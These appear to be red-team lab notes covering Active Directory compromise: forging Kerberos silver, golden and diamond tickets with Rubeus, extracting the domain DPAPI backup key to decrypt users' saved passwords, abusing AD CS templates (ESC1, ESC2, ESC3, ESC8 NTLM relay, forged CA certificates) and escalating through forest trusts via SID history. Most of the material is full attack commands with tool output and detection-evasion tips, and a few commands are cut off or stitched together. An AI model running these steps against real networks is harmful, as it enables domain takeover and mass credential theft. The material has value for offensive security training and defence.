## Phase 2 — Ticket Forgery

**TTP:** T1558 — Steal or Forge Kerberos Tickets

---

### Silver Tickets

**TTP:** T1558.002 — Forge Kerberos Service Tickets

A silver ticket is a **forged TGS** signed with a **service or computer account's secret** — not the krbtgt hash. It targets a specific service on a specific machine.

**Common use case:** Maintain persistent remote access to a machine after the original foothold is lost, using only the computer account hash.

#### Forge Silver Ticket — CIFS Access (Computer Account)

\`\`\`powershell
# Run on attacker desktop (no Beacon needed — fully offline)
C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe silver \`
  /service:cifs/lon-db-1 \`
  /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f \`
  /user:Administrator \`
  /domain:CONTOSO.COM \`
  /sid:S-1-5-21-3926355307-1661546229-813047887 \`
  /nowrap
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/service\` | \`cifs/lon-db-1\` | Target service SPN |
| \`/aes256\` | Computer account AES256 hash | Secret used to encrypt/sign the ticket |
| \`/user\` | \`Administrator\` | Username to impersonate (in the PAC) |
| \`/domain\` | \`CONTOSO.COM\` | Must be uppercase |
| \`/sid\` | Domain SID (without RID) | Used to build the PAC |
| \`/nowrap\` | — | Single-line base64 output |

**Default RIDs used by Rubeus:**
- \`/id\`: \`500\` (Administrator RID)
- \`/groups\`: \`520,512,513,519,518\` (DA, Domain Users, EA, Schema Admins, Group Policy Creator Owners)
- Override with \`/id\` and \`/groups\` when impersonating non-default users

#### Forge Silver Ticket — MSSQL Access (Service Account)

When you have a service account's plaintext password (e.g. from Kerberoasting), convert it to hashes first:

\`\`\`powershell
# Step 1 — Convert plaintext to hashes
Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

# Output:
# rc4_hmac             : FC525C9683E8FE067095BA2DDC971889
# aes256_cts_hmac_sha1 : E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9

# Step 2 — Forge ticket impersonating a known sysadmin (rsteel)
Rubeus.exe silver \`
  /service:MSSQLSvc/lon-db-1.contoso.com:1433 \`
  /rc4:FC525C9683E8FE067095BA2DDC971889 \`
  /user:rsteel \`
  /id:1108 \`
  /groups:513,1106,1107,4602 \`
  /domain:CONTOSO.COM \`
  /sid:S-1-5-21-3926355307-1661546229-813047887 \`
  /nowrap
\`\`\`

> **Why custom \`/id\` and \`/groups\`:** The forged PAC must reflect rsteel's actual RID (\`1108\`) and group memberships for the SQL instance to recognise him as sysadmin. Default group RIDs won't include \`4602\` (Database Admins).

#### Inject and Use Silver Ticket

\`\`\`bash
make_token CONTOSO\\Administrator FakePass

execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe ptt /ticket:[base64]

run klist    # verify ticket present

ls \\\\lon-db-1\\c$    # or sql-whoami for MSSQL ticket
\`\`\`

#### Silver Ticket OPSEC

- **PAC validation** is the main mitigation — when enabled, the target computer sends the PAC to the KDC for signature verification. Silver tickets sign with the computer key, not krbtgt, so this check fails.
- **Detection without PAC validation:** A \`4624\` logon event on the target with **no corresponding \`4769\`** (TGS-REQ) is the indicator — silver tickets are forged offline, so no TGS-REQ is ever sent.
- **Anomaly detection:** Ensure \`/domain\` is uppercase — lowercase domain in a ticket is an IOC some tooling looks for. Rubeus handles this automatically.
- **Lifetime:** Computer account secrets rotate every 30 days by default — silver tickets expire when the secret changes.

---

### Golden Tickets

**TTP:** T1558.001 — Forge Kerberos TGTs

A golden ticket is a **forged TGT** signed with the **krbtgt AES256 hash**. Unlike silver tickets which target one service, golden tickets can be used to request TGS tickets for **any service in the domain**.

**Requires:** krbtgt AES256 hash (obtained via DCSync).

#### Forge Golden Ticket

\`\`\`powershell
# Run on attacker desktop — fully offline
Rubeus.exe golden \`
  /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c \`
  /user:Administrator \`
  /domain:CONTOSO.COM \`
  /sid:S-1-5-21-3926355307-1661546229-813047887 \`
  /nowrap
\`\`\`

#### Inject and Use Golden Ticket

\`\`\`bash
make_token CONTOSO\\Administrator FakePass

execute-assembly Rubeus.exe ptt /ticket:[base64]

run klist
# Shows: Server: krbtgt/CONTOSO.COM (TGT in cache)

ls \\\\lon-dc-1\\c$
# Windows uses the injected TGT to automatically request a CIFS TGS via normal TGS-REQ/TGS-REP

run klist
# Now shows both the TGT AND the newly obtained cifs/lon-dc-1 TGS
\`\`\`

> **Key difference from Silver Ticket:** The golden TGT goes through the normal TGS-REQ process to obtain service tickets — this produces legitimate \`4769\` events. The missing piece is the \`4768\` (AS-REQ) that would normally precede it.

#### Golden Ticket OPSEC

- **Detection:** Missing \`4768\` (AS-REQ) before \`4769\` (TGS-REQ) — the TGT was forged offline, so no AS exchange occurred
- **Mimikatz default lifetime exploit:** Mimikatz sets golden ticket lifetime to **10 years** — immediately detectable by defenders monitoring ticket validity periods. Rubeus respects domain policy by default (10hr/7day renewal)
- **Persistence:** krbtgt hash never auto-rotates — golden ticket access persists until krbtgt is manually reset **twice** (two resets required to fully invalidate all outstanding tickets)

---

### Diamond Tickets

A diamond ticket is functionally identical to a golden ticket but is **created by modifying a legitimate TGT** rather than forging one from scratch. This makes it significantly harder to detect.

**How it differs from Golden Ticket:**

| Property | Golden Ticket | Diamond Ticket |
|---|---|---|
| Creation | Forged offline from scratch | Real TGT requested legitimately, then modified |
| AS-REQ (4768) | Missing — no AS exchange | Present — real AS-REQ was made |
| PAC validity | Signed with krbtgt — valid | Signed with krbtgt — valid |
| Peripheral data | Attacker-controlled — potential anomalies | Inherited from real TGT — accurate domain policy data |
| Detection | Missing 4768 before 4769 | Much harder — looks like a real TGT |

#### Forge Diamond Ticket

\`\`\`bash
# /tgtdeleg — uses delegation trick to get a usable TGT for current user without creds
execute-assembly Rubeus.exe diamond \`
  /tgtdeleg \`
  /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c \`
  /ticketuser:Administrator \`
  /ticketuserid:500 \`
  /domain:CONTOSO.COM \`
  /nowrap
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/tgtdeleg\` | — | Obtain a real TGT for the current user via delegation trick — no credentials needed |
| \`/krbkey\` | krbtgt AES256 | Used to decrypt the TGT, modify the PAC, re-encrypt, re-sign |
| \`/ticketuser\` | \`Administrator\` | Username to substitute into the PAC |
| \`/ticketuserid\` | \`500\` | RID to substitute |
| \`/domain\` | \`CONTOSO.COM\` | Domain FQDN |

**Rubeus outputs two tickets:**
1. Original TGT for current user (pchilds) — used as the base
2. Modified TGT with Administrator's identity — inject this one

#### Verify with Rubeus describe

\`\`\`powershell
# Inspect the modified ticket — confirm Administrator identity with valid signatures
Rubeus.exe describe /servicekey:[krbtgt aes256] /ticket:[base64 modified TGT]
\`\`\`

Key fields to verify:
- \`UserName: Administrator\` — identity successfully substituted
- \`ServerChecksum: (VALID)\` — re-signed correctly with krbtgt
- \`KDCChecksum: (VALID)\` — KDC checksum valid

> **Potential detection point:** The \`FullName\` field in the PAC still shows the original user's full name (e.g. \`Polly Childs\` instead of \`Administrator\`). A thorough analyst examining raw PAC data may spot this discrepancy.

run klist
ls \\\\lon-dc-1\\c$

## Phase 3 — DPAPI Backup Key

**TTP:** T1555 — Credentials from Password Stores

### What the DPAPI Backup Key Is

DPAPI protects secrets (Credential Manager, browser passwords, certificates) by encrypting them with a **masterkey** derived from the user's password. When a user changes their password, the old masterkey becomes inaccessible.

To prevent data loss, a copy of every user's masterkey is encrypted with a **domain-wide backup key** stored in Active Directory. This backup key:
- Is randomly generated at domain creation
- Is **never automatically rotated** (like krbtgt)
- Has no officially supported rotation mechanism
- Can be extracted by a Domain Admin via the BackupKey Remote Protocol

**Adversarial value:** The backup key decrypts **all DPAPI-protected secrets for every user in the domain** — past and present — regardless of password changes.

### Extract the Backup Key

\`\`\`bash
# Requires DA-level Beacon on lon-dc-1
execute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe backupkey
\`\`\`

Output:
\`\`\`
[*] Preferred backupkey Guid : 12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Key                      : HvG1s[...snip...]lXQns=
\`\`\`

Save the base64 key — this is the domain DPAPI backup key.

### Enumerate Credentials Without Backup Key

With local admin on a machine, you can list DPAPI credential blobs for all users — but cannot decrypt them without the masterkey:

\`\`\`bash
execute-assembly SharpDPAPI.exe credentials
# Returns credential file metadata but:
# [X] MasterKey GUID not in cache: {120b3a8a-...}
# Cannot decrypt without the masterkey
\`\`\`

### Decrypt All Credentials Using Backup Key

\`\`\`bash
execute-assembly SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=
\`\`\`

Output:
\`\`\`
TargetName  : Domain:target=TERMSRV/lon-ws-1
UserName    : LON-WS-1\\Administrator
Credential  : Passw0rd!
\`\`\`

**\`/pvk\` parameter:** The domain backup key — SharpDPAPI uses it to decrypt the masterkey for any user, which then decrypts all their DPAPI-protected credential blobs.

### What DPAPI Protects (Attack Surface)

| Secret Type | Tool to Decrypt |
|---|---|
| Windows Credential Manager | \`SharpDPAPI.exe credentials\` |
| Chrome/Edge saved passwords | \`SharpDPAPI.exe rdg\` or browser-specific modules |
| RDP saved credentials | \`SharpDPAPI.exe rdg\` |
| WiFi passwords | \`SharpDPAPI.exe certificates\` |
| Private keys / certificates | \`SharpDPAPI.exe certificates\` |

## What Is ESC1?

ESC1 is a certificate template misconfiguration where **all of the following conditions are true:**

| Condition | Why It Matters |
|---|---|
| Template allows **client authentication** | Certificate can be used for Kerberos PKINIT auth |
| **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** is set | Requester can specify any Subject Alternative Name (SAN) in the CSR |
| Low-privileged users have **enroll rights** | Any domain user can request a certificate from this template |
| **Manager approval not required** | Certificate is issued immediately without review |

> The combination of "any user can enroll" + "requester controls the SAN" + "no approval needed" means any domain user can request a certificate that authenticates as **any other user in the domain** — including Domain Admins.

| Flag | Purpose |
|---|---|
| \`enum-templates\` | Enumerate all certificate templates on the CA |
| \`--filter-enabled\` | Only show templates that are currently enabled |

| \`--hide-admins\` | Suppress templates only enrollable by admins (not exploitable by low-priv users) |

## Step 2 — Request Certificate with Administrator SAN

\`\`\`bash
execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request \\
  --ca "lon-cs-1.contoso.com\\CONTOSO Root CA" \\
  --template ESC1 \\
  --upn Administrator \\
  --quiet
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`--ca\` | \`lon-cs-1.contoso.com\\CONTOSO Root CA\` | Target CA — format: \`<CA host>\\<CA name>\` |
| \`--template\` | \`ESC1\` | Vulnerable template to request from |
| \`--upn\` | \`Administrator\` | UPN to embed in the SAN — what the certificate authenticates as |
| \`--quiet\` | — | Suppress banner |

**What happens:**
\`\`\`
Certify sends a CSR to the CA with:
    Subject Alternative Name: UPN = Administrator@CONTOSO.COM

CA checks:
    YES  Requester has enroll rights on ESC1
    YES  Template allows ENROLLEE_SUPPLIES_SUBJECT
    NO   Does NOT verify that requester owns Administrator's UPN

CA issues certificate authenticating as Administrator

## Step 3 — Request TGT via PKINIT

\`\`\`bash
execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt \\
  /user:Administrator \\
  /domain:CONTOSO.COM \\
  /certificate:[base64 cert] \\
  /enctype:aes256 \\
  /nowrap
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`asktgt\` | — | Request a TGT from the KDC |
| \`/user\` | \`Administrator\` | Must match the UPN in the certificate SAN |
| \`/domain\` | \`CONTOSO.COM\` | Target domain |
| \`/certificate\` | Base64 PFX | Certificate from Certify (includes private key) |
| \`/enctype\` | \`aes256\` | Request AES256 TGT — avoid RC4 |
| \`/nowrap\` | — | Single-line base64 output |

**PKINIT protocol flow:**
\`\`\`
Rubeus sends AS-REQ to KDC with PKINIT pre-authentication (certificate)
    ↓
KDC validates certificate against trusted CA
KDC reads SAN UPN → Administrator@CONTOSO.COM
    ↓
KDC issues TGT for Administrator
\`\`\`

> **PKINIT** is the Kerberos extension allowing certificates in place of passwords for AS-REQ auth. Entirely legitimate — ESC1 abuses the fact that the CA issues a cert with a UPN the requester doesn't own.

## ESC2 — Any Purpose EKU

**TTP:** T1649 — Steal or Forge Authentication Certificates

### What Is ESC2?

A certificate template with the **Any Purpose EKU** (or blank/empty EKUs, treated as Subordinate CA) can be used in place of any other EKU — including Client Authentication. The resulting certificate has no functional restriction.

### Enumerate

\`\`\`bash
execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
\`\`\`

**ESC2 indicators in output:**
\`\`\`
Extended Key Usage        : Any Purpose
Certificate Application Policies : Any Purpose
Manager Approval Required : False
Enrollment Rights         : CONTOSO\\Domain Users
\`\`\`

### Exploit

Since the cert can be used for any purpose, ESC2 is exploited the same way as ESC3 (use it as a Certificate Request Agent):

\`\`\`bash
# Step 1 — Request ESC2 cert (any purpose)
execute-assembly Certify.exe request --ca "lon-cs-1.contoso.com\\CONTOSO Root CA" --template ESC2 --quiet

# Step 2 — Use ESC2 cert as agent to request cert on behalf of Administrator
execute-assembly Certify.exe request-agent --ca "lon-cs-1.contoso.com\\CONTOSO Root CA" --template User --target Administrator --agent-pfx [ESC2 CERT] --quiet

# Step 3 — PKINIT → DA TGT
execute-assembly Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
\`\`\`

> If \`ENROLLEE_SUPPLIES_SUBJECT\` is also enabled on the ESC2 template, exploit it as ESC1 instead — request cert with arbitrary SAN directly.

## ESC3 — Certificate Request Agent EKU

**TTP:** T1649 — Steal or Forge Authentication Certificates

### What Is ESC3?

A template with the **Certificate Request Agent EKU** allows the certificate holder to sign certificate requests **on behalf of other users**. This is a two-step attack:

1. Request a cert from the ESC3 template (gets you Certificate Request Agent capability)
2. Use that agent cert to request a cert from another template (e.g. \`User\`) **as Administrator**

### Enumerate

\`\`\`bash
execute-assembly Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
\`\`\`

**ESC3 indicators:**
\`\`\`
Extended Key Usage                : Certificate Request Agent
Certificate Application Policies : Certificate Request Agent
Manager Approval Required         : False
Authorized Signatures Required    : 0
Enrollment Rights                 : CONTOSO\\Domain Users
\`\`\`

> \`Authorized Signatures Required: 0\` is critical — if this were non-zero, the agent cert would need to be co-signed, blocking the attack.

### Exploit — Two-Step Process

**Step 1 — Request Certificate Request Agent cert:**

\`\`\`bash
execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request \\
  --ca "lon-cs-1.contoso.com\\CONTOSO Root CA" \\
  --template ESC3 \\
  --quiet

# Output: Certificate (PFX): MIACAQ[...snip...]AAAAA=
# Current user context: CONTOSO\\pchilds
\`\`\`

**Step 2 — Use agent cert to request cert as Administrator:**

\`\`\`bash
execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request-agent \\
  --ca "lon-cs-1.contoso.com\\CONTOSO Root CA" \\
  --template User \\
  --target Administrator \\
  --agent-pfx MIACAQ[...snip...]AAAAA= \\
  --quiet

# Output: Certificate (PFX) for Administrator
\`\`\`

**\`request-agent\` flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`--ca\` | CA FQDN\\Name | Target certificate authority |
| \`--template\` | \`User\` | Template to request from — must have Client Authentication EKU |
| \`--target\` | \`Administrator\` | User to impersonate in the on-behalf-of request |
| \`--agent-pfx\` | Base64 ESC3 cert | The Certificate Request Agent cert from Step 1 |

**Step 3 — PKINIT → DA TGT:**

\`\`\`bash
execute-assembly Rubeus.exe asktgt \\
  /user:Administrator \\
  /domain:CONTOSO.COM \\
  /certificate:[ADMIN CERT] \\
  /enctype:aes256 \\
  /nowrap

### Why \`User\` Template for Step 2

The \`User\` template has **Client Authentication EKU** enabled — required for PKINIT. Any template with Client Authentication and no manager approval works. The agent cert from ESC3 acts as the authorization signature.

## ESC8 — NTLM Relay to HTTP AD CS Endpoint

**TTP:** T1557 — Adversary-in-the-Middle
**TTP:** T1649 — Steal or Forge Authentication Certificates

### What Is ESC8?

AD CS web enrollment (\`/certsrv/\`) over HTTP without channel binding is vulnerable to NTLM relay. An attacker who can coerce a machine (e.g. a DC) to authenticate can relay those credentials to the CA's web enrollment endpoint and obtain a certificate as that machine account.

**Identify via Certify:**
\`\`\`bash
execute-assembly Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

# ESC8 indicator:
# ESC8 : The CA supports HTTP web enrollment without channel binding.
# Legacy ASP Enrollment Website : http://lon-cs-1.contoso.com/certsrv/
\`\`\`

The screenshot shows the \`/certsrv/\` web enrollment page — accessible over plain HTTP (not HTTPS with channel binding enforced).

### Setup — Port 445 Unbinding

Port 445 is bound by \`srvnet.sys\` and cannot be simply stopped. Three services must be stopped in order:

\`\`\`bash
# 1. Reconfigure lanmanserver to DISABLED (prevents auto-restart)
sc_config lanmanserver "C:\\Windows\\system32\\svchost.exe -k netsvcs -p" 1 4

# 2. Stop services in dependency order
sc_stop lanmanserver
sc_stop srv2
sc_stop srvnet

# Verify 445 is unbound
netstat    # port 445 should no longer appear
\`\`\`

> **WARNING:** Unbinding port 445 breaks ALL SMB-based services — file shares, SMB Beacons, lateral movement via SMB. Only do this on a machine where these services are non-critical. Plan your Beacon topology before starting.

### Setup — Reverse Port Forward

\`\`\`bash
# Forward port 445 on target → attacker desktop Docker container on port 7445
rportfwd_local 445 localhost 7445

# Verify — port 445 now listening, PID is Beacon process (not System/PID 4)
netstat

# Start SOCKS proxy for ntlmrelayx to use
socks 1080 socks5
\`\`\`

**\`rportfwd_local\` vs \`rportfwd\`:**

| Command | Forwards to |
|---|---|
| \`rportfwd\` | Team server (attacker IP via team server) |
| \`rportfwd_local\` | CS client machine (attacker desktop localhost) |

> Use \`rportfwd_local\` here because ntlmrelayx runs in Docker on the attacker desktop, not on the team server.

### Setup — ntlmrelayx in Docker

\`\`\`bash
# Start Kali Docker container
docker container start -i kali-1

# Run ntlmrelayx via proxychains (routes back to target network through SOCKS)
proxychains impacket-ntlmrelayx \\
  -t http://10.10.120.5/certsrv/certfnsh.asp \\
  -smb2support \\
  --adcs \\
  --template DomainController
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`-t\` | \`http://[CA IP]/certsrv/certfnsh.asp\` | Target — CA web enrollment endpoint |
| \`-smb2support\` | — | Support SMBv2 authentication |
| \`--adcs\` | — | AD CS relay mode — request certificate instead of standard relay |
| \`--template\` | \`DomainController\` | Template to request — must support DC authentication |

> \`proxychains\` routes ntlmrelayx's outbound requests through the SOCKS proxy → Beacon → target CA. The NTLM auth arrives from the DC via the reverse port forward.

### Trigger Coercion

\`\`\`bash
# Coerce DC to authenticate to our machine (same PrinterBug technique as S4U2Self lab)
execute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
\`\`\`

**Attack flow:**
\`\`\`
SharpSpoolTrigger → DC authenticates to lon-ws-1 (our machine)
    ↓
NTLM auth arrives on port 445 → reverse port forward → Docker port 7445
    ↓
ntlmrelayx catches it → proxychains → SOCKS proxy → Beacon → CA /certsrv/
    ↓
CA issues DomainController certificate for LON-DC-1$
    ↓
ntlmrelayx saves LON-DC-1.pfx
\`\`\`

**ntlmrelayx output on success:**
\`\`\`
[*] (SMB): Authenticating connection from CONTOSO/LON-DC-1$@172.17.0.1 against http://10.10.120.5 SUCCEED
[*] http://CONTOSO/LON-DC-1$@10.10.120.5 → GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./LON-DC-1.pfx
\`\`\`

### Post-Relay — S4U2Self to DA

With the DC machine cert:

## DPERSIST1 — Golden Certificate (CA Key Theft)

**TTP:** T1649 — Steal or Forge Authentication Certificates
**TTP:** T1552.004 — Unsecured Credentials: Private Keys

### What Is DPERSIST1?

If an attacker compromises the CA server and extracts its private key, they can **forge certificates offline indefinitely** — signed with the real CA key, indistinguishable from legitimately issued certificates. This is the ADCS equivalent of stealing the krbtgt hash for Golden Tickets.

**Why it's persistence:** The CA certificate's private key is never automatically rotated (like krbtgt). A stolen CA key is valid for the entire lifetime of the CA certificate — potentially decades.

### Step 1 — Move Laterally to CA Server

\`\`\`bash
# CA server: lon-cs-1 (Tier 0 asset — requires DA or equivalent to access)
# Use standard lateral movement chain — impersonate DA, jump to lon-cs-1
make_token CONTOSO\\[DA account] [password]
ak-settings spawnto_x64 C:\\Windows\\System32\\svchost.exe
jump psexec64 lon-cs-1 smb
\`\`\`

### Step 2 — Dump CA Certificate and Private Key

\`\`\`bash
# From SYSTEM Beacon on lon-cs-1
execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe manage-self --dump-certs --quiet

# Output: Certificate (PFX) — CONTOSO Root CA: MIACAQ[...snip...]AAAAA=
\`\`\`

### Step 3 — Save to Attacker Desktop

\`\`\`powershell
[IO.File]::WriteAllBytes("C:\\Users\\Attacker\\Desktop\\contoso-root-ca.pfx", [Convert]::FromBase64String("MIACAQ[...snip...]AAAAA="))
\`\`\`

### Step 4 — Forge Certificate Offline

Run on attacker desktop (no Beacon needed — fully offline):

\`\`\`powershell
C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe forge \\
  --ca-cert .\\Desktop\\contoso-root-ca.pfx \\
  --upn Administrator \\
  --subject "CN=Administrator,CN=Users,DC=contoso,DC=com" \\
  --sid S-1-5-21-3926355307-1661546229-813047887-500 \\
  --crl "ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com" \\
  --quiet
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`--ca-cert\` | Path to stolen CA PFX | The CA's private key used to sign the forged cert |
| \`--upn\` | \`Administrator\` | UPN to embed in SAN — what PKINIT authenticates as |
| \`--subject\` | DN string | Certificate subject — cosmetic but should be realistic |
| \`--sid\` | Administrator SID | Embedded in cert for PAC generation |
| \`--crl\` | LDAP CRL path | Certificate Revocation List distribution point — must be valid |

**Certify output:**
\`\`\`
CA Certificate Information:
  Subject    : CN=CONTOSO Root CA, DC=contoso, DC=com
  Thumbprint : 73B4B551DB60427D0CBD5D2E2658BCB2088F3F2C
  End Date   : 8/30/2125 11:29:39 AM   ← 100 year validity

Forged Certificate Information:

  End Date       : 2/28/2027 2:33:47 PM   ← 1 year forged cert validity
  Thumbprint     : EBE370DFB276BEEB209D690EEC38DC6F36181638

\`\`\`bash

# ESC8 — NTLM relay to /certsrv/ → DC cert → S4U2Self → DA

- **ESC2** is exploited the same way as ESC3 — any-purpose cert acts as a certificate request agent
- **ESC3** is a two-step attack — agent cert first, then on-behalf-of request for the target user
- **ESC4** turns a template write permission into an ESC1 — always check \`WriteProperty\`/\`WriteDacl\`/\`WriteOwner\` on templates and restore after exploitation

## Background — Why Parent-Child Trusts Are Exploitable

In an AD forest, parent and child domains automatically establish a **bidirectional transitive trust** (\`TRUST_DIRECTION_BIDIRECTIONAL\`, \`TRUST_ATTRIBUTE_WITHIN_FOREST\`). This means:

- Users in the child domain can authenticate to resources in the parent domain
- Users in the parent domain can authenticate to resources in the child domain

The attack abuses **SID history** — a field in the Kerberos PAC that allows a migrated user's old SIDs to be preserved for resource access. When a Golden Ticket is forged with an extra SID (\`/sids\`) pointing to the parent's **Enterprise Admins group**, the parent DC sees the ticket and grants Enterprise Admin-level access.

> **Key insight:** Compromising a child domain's krbtgt hash gives you the ability to forge tickets that the parent DC will honour — because the forest trust means the parent DC trusts tickets signed by the child's krbtgt. Adding the Enterprise Admins SID to the ticket's SID history is what escalates you to forest-wide admin.

---

## Step 1 — Enumerate the Trust

\`\`\`bash
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
\`\`\`

**Key attribute values:**

| Attribute | Value | Meaning |
|---|---|---|
| \`trustDirection\` | \`3\` | \`TRUST_DIRECTION_BIDIRECTIONAL\` — both domains trust each other |
| \`trustAttributes\` | \`32\` | \`TRUST_ATTRIBUTE_WITHIN_FOREST\` — same forest, transitive trust |
| \`trustPartner\` | \`contoso.com\` | The trusted partner (parent domain) |
| \`flatName\` | \`CONTOSO\` | NetBIOS name of parent |

> \`TRUST_ATTRIBUTE_WITHIN_FOREST\` is the critical flag — within-forest trusts are fully transitive and SID history is honoured. Cross-forest trusts (\`TRUST_ATTRIBUTE_FOREST_TRANSITIVE\`) have SID filtering enabled by default, which blocks the SID history attack.

**TTP:** T1482 — Domain Trust Discovery

## Step 2 — Collect Required SIDs

### Child Domain SID

\`\`\`bash
ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
\`\`\`

> Result: \`S-1-5-21-690277740-3036021016-2883941857\`

This is the **domain SID** of the child domain — used as the \`/sid\` parameter in the Golden Ticket.

### Parent Enterprise Admins SID

\`\`\`bash
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
\`\`\`

> Result: \`S-1-5-21-3926355307-1661546229-813047887-519\`

This is the SID of the **Enterprise Admins group** in the parent domain. RID \`519\` is always Enterprise Admins. This goes in \`/sids\` — the SID history field.

**Why Enterprise Admins (RID 519):**
- Enterprise Admins is the highest-privileged group in an AD forest
- It has admin rights across all domains in the forest by default
- Adding this SID to the ticket's SID history grants forest-wide admin access

## Step 4 — Forge Golden Ticket with SID History

Run on the attacker desktop (fully offline — no Beacon required):

\`\`\`powershell

  /sid:S-1-5-21-690277740-3036021016-2883941857 \`
  /sids:S-1-5-21-3926355307-1661546229-813047887-519 \`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/user\` | \`Administrator\` | Username to impersonate in the ticket |
| \`/domain\` | \`dublin.contoso.com\` | Child domain — the ticket is issued for this domain |
| \`/sid\` | Child domain SID | The domain SID for the child — ticket's issuing domain |

| \`/aes256\` | Child krbtgt AES256 | Signing key — child's krbtgt hash |

                       → grants Enterprise Admin access across the entire forest

## What Happens at the Trust Boundary

\`\`\`
Beacon presents Golden Ticket (child domain TGT + EA SID in SID history)
    ↓
Request crosses trust boundary to contoso.com (lon-dc-1)
    ↓
lon-dc-1 KDC decrypts the inter-realm ticket using the trust key
    ↓
KDC reads PAC — sees Administrator@dublin.contoso.com
    ↓
KDC also reads SID history — sees S-1-5-21-...-519 (Enterprise Admins)
    ↓
KDC issues a service ticket (TGS) for CIFS/lon-dc-1 granting EA-level access
    ↓
lon-dc-1 SMB service accepts — grants access as Enterprise Admin

## SID Filtering — Why This Works Within Forest But Not Cross-Forest

| Trust Type | SID Filtering | SID History Attack |
|---|---|---|
| Within-forest (\`TRUST_ATTRIBUTE_WITHIN_FOREST\`) | **Disabled by default** | ✅ Works — EA SID in history is honoured |
| Cross-forest (\`TRUST_ATTRIBUTE_FOREST_TRANSITIVE\`) | **Enabled by default** | ❌ Blocked — foreign SIDs stripped from PAC |
| Cross-forest with SID filtering disabled | Disabled (misconfigured) | ✅ Works |

> SID filtering (\`quarantine\` flag) strips SIDs from foreign domains out of the PAC before the ticket is processed. Within-forest trusts don't apply filtering because all domains are assumed to be under the same administrative control — which is exactly what this attack exploits.

| Scenario | Method | Key Requirement |
|---|---|---|
| Child → Parent (this lab) | Golden Ticket + \`/sids\` EA SID | Child domain krbtgt AES256 |
| Parent → Child | Parent DA already has child DA implicitly | Standard DA access |
| Cross-forest (inbound) | Requires SID filtering bypass or other technique | Much harder |

- \`trustAttributes=32\` (\`TRUST_ATTRIBUTE_WITHIN_FOREST\`) = SID filtering disabled = SID history attack works
- \`trustDirection=3\` = bidirectional — both domains trust each other, cross-domain ticket exchange works in both directions
- The \`/sids\` flag in Rubeus \`golden\` is the entire mechanism — it injects the Enterprise Admins SID into the ticket's SID history field
- \`/domain\` must be the **child domain** — the ticket is signed by the child's krbtgt, so it must be issued for the child domain

## Background — One-Way Inbound Trust

\`\`\`
CONTOSO → trusts → partner.com   (inbound from CONTOSO's perspective)
\`\`\`

**Direction from CONTOSO's perspective:**
- \`TRUST_DIRECTION_INBOUND (1)\` = partner.com trusts CONTOSO
- partner.com users can access CONTOSO resources? **No**
- CONTOSO users can access partner.com resources? **Yes — if granted**

> An inbound trust means the foreign domain (partner.com) trusts our domain (CONTOSO). CONTOSO users can authenticate to partner.com resources, but only if partner.com has explicitly granted them access. The enumeration phase is about finding WHERE that access exists.

**\`trustAttributes=8\` = \`TRUST_ATTRIBUTE_FOREST_TRANSITIVE\`** — this is a cross-forest trust (different AD forest), not within-forest. SID filtering is **enabled by default** — the SID history Golden Ticket attack from the Parent-Child lab does not work here.

Unlike within-forest trust hops, cross-forest authentication requires manually walking the **Kerberos referral chain** — the KDC doesn't do it automatically when you have a hash.

### Step 3 — Request Inter-Realm Referral Ticket

\`\`\`bash
krb_asktgs /service:krbtgt/partner.com /ticket:[RSTEEL TGT]
\`\`\`

**What this does:**
\`\`\`
rsteel's TGT → TGS-REQ to CONTOSO KDC requesting krbtgt/partner.com
    ↓
CONTOSO KDC sees partner.com trust → issues inter-realm referral ticket
    ↓
Inter-realm ticket is encrypted with the trust key (shared secret between domains)
    ↓
This ticket is proof of rsteel's identity to the partner.com KDC
\`\`\`

